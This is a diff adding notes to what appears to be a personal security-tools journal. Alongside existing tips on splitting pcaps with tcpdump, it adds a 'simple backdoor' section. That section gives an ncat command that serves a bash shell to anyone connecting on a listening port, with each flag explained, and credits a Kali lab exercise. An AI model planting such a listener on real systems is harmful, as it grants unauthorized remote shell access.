@@ -159,3 +159,13 @@ Method 1: Split into multiple files
 If, for example, `big.pcap` is 3GB big, tcpdump's -C (file size) flag may be used to carve `big.pcap` into 1GB pcaps.  
 The output of this command will generate `small.pcap` `small.pcap1` `small.pcap2`  
 If you're looking for a specific TCP stream or conversation, the entire connection will most likely be captured in a 1GB pcap slice. It's also palatable enough to open the slice on wireshark!
+
+## Simple backdoor with ncat  
+(Note: Discovered this in [linuxzoo.net's kali room](https://linuxzoo.net/page/lab_kali2024-4/wk01c.html#frm_17))  
+
+You can create a simple backdoor with [ncat](https://laufeynumber1fan.github.io/tool-journal.html#ncat) by executing a bash shell upon connecting to a `ncat` session:
+
+`ncat -l localhost 7890 -c '/bin/bash' -k`  
+`-l` Make port 7890 to listen for ncat connections.  
+`-c` Run a bash shell upon connection.  
+`-k` Allow multiple connections (in this case shells).  
